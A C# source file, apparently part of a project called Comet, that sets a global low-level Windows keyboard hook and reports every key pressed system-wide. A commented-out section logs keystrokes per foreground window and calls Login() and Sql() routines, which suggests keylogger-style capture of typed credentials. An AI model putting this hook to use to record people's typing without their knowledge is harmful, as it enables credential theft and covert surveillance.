using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Comet
{





    class Keyboard
    {



        #region Imports

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);


        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        #endregion




        #region Constants

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        #endregion


        #region Delegates
        internal delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        #endregion



        #region Events
        public static event EventHandler KeyboardAction = delegate { };


        public class KeyboardEventArgs : EventArgs
        {
            private string m_Data;
            public KeyboardEventArgs(string _myData)
            {
                m_Data = _myData;
            } // eo ctor

            public string Data { get { return m_Data; } }
        }
        #endregion








        public static string CurrentKeyPressed;






        public Keyboard()
        {
            var retVal = SetHook(_proc);


        }

        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }



        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                CurrentKeyPressed = ((Keys)vkCode).ToString();

                KeyboardAction(null, new KeyboardEventArgs(CurrentKeyPressed));

                
            }
                /*
                IntPtr win = GetForegroundWindow();

                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    myStack.Push(((Keys)vkCode).ToString());


                    // handle backspaces in stack. This does not handle a the cursor being moved to a different location.
                    if (((Keys)vkCode).ToString() == "Back")
                    {
                        myStack.Remove(myStack.Count() - 1); // remove back
                        myStack.Remove(myStack.Count() - 1); // remove new letter
                    }




                    if (_currentApp == (int)win || _currentApp == 0)
                    {
                        _currentApp = (int)win;
                        Login();
                        // Sql();

                    }




                }

                    */
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }













    }
}
